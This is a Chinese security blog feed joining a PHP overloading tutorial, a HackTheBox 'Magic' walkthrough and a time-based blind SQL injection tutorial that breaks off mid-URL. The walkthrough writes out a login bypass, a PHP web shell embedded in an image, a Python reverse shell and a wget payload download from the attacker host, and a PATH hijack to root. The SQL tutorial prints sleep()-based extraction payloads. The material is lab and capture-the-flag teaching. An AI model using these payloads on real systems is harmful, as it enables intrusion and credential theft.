class="variable">$m</span>-&gt;show();</span><br></pre></td></tr></table></figure><ol start="6"><li>方法重载的主要目的：不让外部访问出错。当然，如果必要时也可以进行内部访问</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">staticShow</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//方法重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//允许访问列表</span></span><br><span class="line">        <span class="variable">$allow</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判定是否在列表中</span></span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$name</span>,<span class="variable">$allow</span>)) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>(<span class="variable">$arg</span>);</span><br><span class="line">        <span class="comment">//其他情况</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//不允许访问</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>PHP重载不是指同名方法，而是指对象或者类在访问一些不允许或者不存在的属性或者方法的时候自动调用的魔术方法</li><li>PHP重载分为属性重载和方法重载</li><li>PHP重载的目的是为了保护程序的正确运行而提供的一种容错机制</li><li>并非所有类都需要实现这些重载，只是如果有类需要对外提供访问使用的时候才有必要采取</li></ol><hr><blockquote><p><strong>思考</strong>：如果我们想把对象内部的所有属性都输出出来，该如何实现呢？</p></blockquote><blockquote><p><strong>引入</strong>：从业务的角度出发，一般不会有此需求：因为对象内部有私有、受保护和公有属性，而能够被外部访问的只有公有属性。如果只是单纯的想了解对象内部有哪些公有属性，可以使用foreach对对象进行遍历</p></blockquote><h3 id="11-对象遍历foreach【了解】"><a href="#11-对象遍历foreach【了解】" class="headerlink" title="11. 对象遍历foreach【了解】"></a><strong>11. 对象遍历foreach【了解】</strong></h3><blockquote><p><strong>定义</strong>：遍历对象，其实就是指将对象中的所有属性（公有属性）以键值对的形式取出并进行访问</p></blockquote><ol><li>使用foreach对对象进行遍历</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;LiLei&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$height</span> = <span class="number">178</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weight</span> = <span class="number">140</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$m</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$k</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$v</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="comment">//$k为属性名，$v为属性值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>foreach可以对对象像数组一样遍历</li><li>foreach遍历对象遍历的是对象内部的所有公有属性（在类外部进行对象遍历）</li></ol><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Magic-Walkthrough</title>
      <link href="/2020/04/22/HackTheBox-Magic/"/>
      <url>/2020/04/22/HackTheBox-Magic/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1431001467&auto=1&height=66"></iframe><h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1580.png" alt="图片"></p><p>靶机名：<code>Magic</code><br>OS：Linux<br>难度：中等<br>靶机IP：<code>10.10.10.185</code></p><h2 id="运用到的知识"><a href="#运用到的知识" class="headerlink" title="运用到的知识"></a>运用到的知识</h2><p><code>SQL</code>万能密码原理<br><code>mysqldump</code>备份数据库<br><code>sysinfo</code>利用<code>lshw</code>提权</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先拿到靶机<code>IP</code>先对他进行端口扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 10.10.10.185 -T4</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1581.png" alt="图片"></p><p>发现了靶机开放了<code>22</code>（ssh）、<code>80</code>（http）服务，其他的端口被过滤了，我们先从web服务开始下手吧：（发现是一个图片托管站点）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1582.png" alt="图片"></p><p>打开后发现了一个登陆点：<a href="http://10.10.10.185/login.php">http://10.10.10.185/login.php</a></p><p>常规弱口令尝试了一遍失败了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1583.png" alt="图片"></p><h2 id="万能密码登陆后台GetSHELL"><a href="#万能密码登陆后台GetSHELL" class="headerlink" title="万能密码登陆后台GetSHELL"></a>万能密码登陆后台GetSHELL</h2><p>后来发现这是PHP的站，随后一个万能密码就登陆进去了：(<code>#</code>在<code>SQL</code>中代表<code>注释</code>，也就是说我们只需要输入正确的账号<code>#</code>，就能成功登陆)</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1584.png" alt="图片"></p><p>登陆成功后来到了一个上传点：<a href="http://10.10.10.185/upload.php">http://10.10.10.185/upload.php</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1585.png" alt="图片"></p><p>之后我制作了一个图片马：（得安装一下<code>exiftool</code>这个工具）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#写入一句话到 saul.jpg</span><br><span class="line">exiftool -Comment=&#x27;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#x27;cmd&#x27;]); ?&gt;&#x27; saul.jpg</span><br><span class="line"></span><br><span class="line">#复制一个saul.php.jpg文件</span><br><span class="line">cp saul.jpg saul.php.jpg</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1586.png" alt="图片"></p><p>然后上传 <code>saul.php.jpg</code> 图片马成功<code>GetSHELL</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1587.png" alt="图片"></p><p>随后利用<code>python</code>反弹<code>shell</code>到<code>nc</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.12&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1588.png" alt="图片"></p><p>之后先得到一个 <code>bash</code> 外壳，不然 <code>sh</code> 外壳很难受：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1589.png" alt="图片"></p><p>随后切换到网站根目录发现了一个配置文件里面有账号和密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private static $dbName = &#x27;Magic&#x27; ;</span><br><span class="line">private static $dbHost = &#x27;localhost&#x27; ;</span><br><span class="line">private static $dbUsername = &#x27;theseus&#x27;;</span><br><span class="line">private static $dbUserPassword = &#x27;iamkingtheseus&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1590.png" alt="图片"></p><p>然而我查看 <code>passwd</code> 文件发现也有这个账号：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1591.png" alt="图片"></p><p>猜测有可能会撞库，<code>ssh</code> 的账号有可能和配置文件的账号密码是一样的，我们先 <code>su</code> 切换一下用户：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1592.png" alt="图片"></p><p>发现提示：<code>su: must be run from a terminal</code></p><p>之后Google了一下发现有类似情况：<a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal/41872292">su: must be run from a terminal</a></p><p>发现可以用这个绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; &gt; /tmp/asdf.py</span><br><span class="line">$ python3 /tmp/asdf.py</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1593.png" alt="图片"></p><p>虽然是绕过了，但是还是登陆失败！</p><h2 id="备份数据库发现密码"><a href="#备份数据库发现密码" class="headerlink" title="备份数据库发现密码"></a>备份数据库发现密码</h2><p>之后用 <code>mysqldump</code> 备份了一下数据库发现了一些信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -utheseus -piamkingtheseus Magic</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1594.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magic</span><br><span class="line">mysqldump -utheseus -piamkingtheseus Magic</span><br><span class="line">mysqldump: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)</span><br><span class="line">--</span><br><span class="line">-- Host: localhost    Database: Magic</span><br><span class="line">-- ------------------------------------------------------</span><br><span class="line">-- Server version       5.7.29-0ubuntu0.18.04.1</span><br><span class="line"></span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;</span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line">/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;</span><br><span class="line">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */;</span><br><span class="line">/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;</span><br><span class="line">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;</span><br><span class="line">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#x27;NO_AUTO_VALUE_ON_ZERO&#x27; */;</span><br><span class="line">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Table structure for table `login`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `login`;</span><br><span class="line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span><br><span class="line">/*!40101 SET character_set_client = utf8 */;</span><br><span class="line">CREATE TABLE `login` (</span><br><span class="line">  `id` int(6) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(50) NOT NULL,</span><br><span class="line">  `password` varchar(100) NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `username` (`username`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;</span><br><span class="line">/*!40101 SET character_set_client = @saved_cs_client */;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Dumping data for table `login`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES `login` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `login` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `login` VALUES (1,&#x27;admin&#x27;,&#x27;Th3s3usW4sK1ng&#x27;);</span><br><span class="line">/*!40000 ALTER TABLE `login` ENABLE KEYS */;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;</span><br><span class="line"></span><br><span class="line">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span><br><span class="line">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2020-04-21 19:34:38</span><br><span class="line">www-data@ubuntu:/var/www/Magic$ </span><br></pre></td></tr></table></figure><p>我们得到了一个敏感的插入字段的SQL语句从而又得到了一个账号密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `login` VALUES (1,&#x27;admin&#x27;,&#x27;Th3s3usW4sK1ng&#x27;);</span><br></pre></td></tr></table></figure><p>使用 <code>su</code> 切换到 <code>theseus</code> 用户使用刚刚得到的密码登陆成功：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1595.png" alt="图片"></p><p>之后在用户<code>home</code>目录下拿到 <code>user.txt</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1596.png" alt="图片"></p><h2 id="sysinfo权限提升root"><a href="#sysinfo权限提升root" class="headerlink" title="sysinfo权限提升root"></a>sysinfo权限提升root</h2><p>这个时候就先想办法登陆到它的<code>ssh</code>，我先是在本地kali生成了一个<code>ssh公钥</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1597.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9DpODZcrjmZeJaBpvd1Jb2a+liQdQfoSA/ld4BeEZtoVeFbCm8Uhq1SgVV9q9Mjqp0EKvxmDlZzyYkT+cc9c7ffI2aqUuZlg+B1KZ5tWfdP6NN6EGaDE5aFoKWRlvIaHFTftcnTRvuh3hF9CAX2f5GtLdQ5EAB+LyYbi+EaYKNzkk8/Dp7XVQXk+hm5vRkATNN0cxaZjbv6/L6CTyI4ZPcqio+X2mMz9G4j7e7vdpik10TDIWebLAir/9rkJtkCkMawIOddug8ajHbcvFhokXCuYTcWXHKkuvo0zRiAhyoeMK9f8Hb5DfMZhrNPm0xHaK5bkMOmUlUOtLV8w7k2aCkZ+Cm+uLdVeh409GrlddNPsyD3Qi9gGbPbd+SlOlvvBqEcnQXQdWXHmd6KLbs4syiemiLbxRDizEVKL6hF7AumCpl84/6MUAfbmKZc6COrC4qynyS6xTuU1OS5UsS3dTna8v6o8bcrbIDL0GZIYfhbcomyKHvzkSDiihxGdSYU0= root@kali</span><br></pre></td></tr></table></figure><p>之后再靶机上<code>echo</code> 这个 <code>id_rsa.pub</code>一个公钥命名为<code>authorized_keys</code>（这个文件用于连接SSH）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9DpODZcrjmZeJaBpvd1Jb2a+liQdQfoSA/ld4BeEZtoVeFbCm8Uhq1SgVV9q9Mjqp0EKvxmDlZzyYkT+cc9c7ffI2aqUuZlg+B1KZ5tWfdP6NN6EGaDE5aFoKWRlvIaHFTftcnTRvuh3hF9CAX2f5GtLdQ5EAB+LyYbi+EaYKNzkk8/Dp7XVQXk+hm5vRkATNN0cxaZjbv6/L6CTyI4ZPcqio+X2mMz9G4j7e7vdpik10TDIWebLAir/9rkJtkCkMawIOddug8ajHbcvFhokXCuYTcWXHKkuvo0zRiAhyoeMK9f8Hb5DfMZhrNPm0xHaK5bkMOmUlUOtLV8w7k2aCkZ+Cm+uLdVeh409GrlddNPsyD3Qi9gGbPbd+SlOlvvBqEcnQXQdWXHmd6KLbs4syiemiLbxRDizEVKL6hF7AumCpl84/6MUAfbmKZc6COrC4qynyS6xTuU1OS5UsS3dTna8v6o8bcrbIDL0GZIYfhbcomyKHvzkSDiihxGdSYU0= root@kali&quot; &gt; authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1598.png" alt="图片"></p><p>紧接着在KALI连接SSH公钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /root/.ssh/id_rsa theseus@10.10.10.185</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1599.png" alt="图片"></p><p>登陆成功后我在 <code>/bin</code> 目录下发现了一个 <code>sysinfo</code> 引起了我的注意（有<code>root</code>权限）:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1600.png" alt="图片"></p><p>之后我在本机KALI开启一个web服务用于上传文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">9000</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1601.png" alt="图片"></p><p>我们的 <code>lshw</code> 文件 是 <code>Linux</code> 下一个可以<code>查看硬件信息</code>的文件，然后我建立的 <code>lshw</code> 文件是一个<code>python的反向连接nc</code>的payload：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1602.png" alt="图片"></p><blockquote><p>这样目标在运行了这个文件那么我们就会反弹shell到nc从而进行权限提升！</p></blockquote><p>随后在目标靶机上下载<code>lshw</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.14.12:9000/lshw</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1603.png" alt="图片"></p><p>最后设置环境变量为<code>lshw</code>所在的目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp/saul:$PATH</span><br></pre></td></tr></table></figure><p><code>nc</code> 监听端口 <code>4444</code>，然后运行 <code>sysinfo</code> 成功反弹<code>root权限的shell</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1604.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1605.png" alt="图片"></p><p>之后让它得到一个<code>bash</code>外壳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1606.png" alt="图片"></p><p>最后也是在 <code>/root</code> 目录拿到 <code>root.txt</code> 完成这次靶机演练！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL手注之延时盲注(基于时间的盲注)</title>
      <link href="/2020/04/18/MySQL-4/"/>
      <url>/2020/04/18/MySQL-4/</url>
      
        <content type="html"><![CDATA[<h2 id="延时盲注简介"><a href="#延时盲注简介" class="headerlink" title="延时盲注简介"></a>延时盲注简介</h2><p>延时注入：部分网站没办法 <code>union select</code> 联合查询方式注入 、部分网站没有输出显示，只能通过延时判断；</p><p>环境：<code>Sqli-tabs</code></p><p>注入点：<code>http://127.0.0.1/sqli/Less-9/</code></p><p>核心代码：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1565.png" alt="图片"></p><p>也就是说：我们在查询的语句都会记录到 <code>result.txt</code> 这个文件里：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1566.png" alt="图片"></p><p>而且无论你输入什么，网站页面都会给你返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in...........</span><br></pre></td></tr></table></figure><p>所以说我们不能用常规的联合查询注入或者说报错注入以及布尔盲注来进行SQL注入攻击，只能通过<code>时间注入</code>来进行SQL注入攻击！</p><p>最主要的产生注入查询是这段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h3 id="延时注入函数"><a href="#延时注入函数" class="headerlink" title="延时注入函数"></a>延时注入函数</h3><p><code>IF</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式：IF(Condition,A,B) </span><br><span class="line">含义：如果Condition条件成⽴，则执行语句A，否则执行语句B</span><br></pre></td></tr></table></figure><p>还有很多函数如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr函数 </span><br><span class="line">ascii函数</span><br></pre></td></tr></table></figure><blockquote><p>mysql&gt;=5.0 使⽤sleep()进⾏查询 </p></blockquote><blockquote><p>mysql&lt;5.0使⽤benchmark()进⾏查询 </p></blockquote><p><code>benchmark</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">benchmark是通过查询次数增多，时间变得缓慢来判断是否存在延迟</span><br><span class="line">select benchmark(1000,select * from admin);</span><br></pre></td></tr></table></figure><h2 id="sleep函数进行时间盲注"><a href="#sleep函数进行时间盲注" class="headerlink" title="sleep函数进行时间盲注"></a>sleep函数进行时间盲注</h2><p>判断是否存在延迟注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1567.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1568.png" alt="图片"></p><p>由上图可见，它响应了<code>6秒</code>，也其实差不多了（相差一秒）</p><h3 id="判断当前用户"><a href="#判断当前用户" class="headerlink" title="判断当前用户"></a>判断当前用户</h3><p>上帝视角告诉你当前用户是：<code>root</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1569.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(ascii(substr(user(),1,1))=114,sleep(5),1) --+</span><br><span class="line">注释：</span><br><span class="line">判断user()用户的第一个字符是否为Ascii码的114，如果是那么延时5秒</span><br><span class="line">114的Ascii码是r</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and 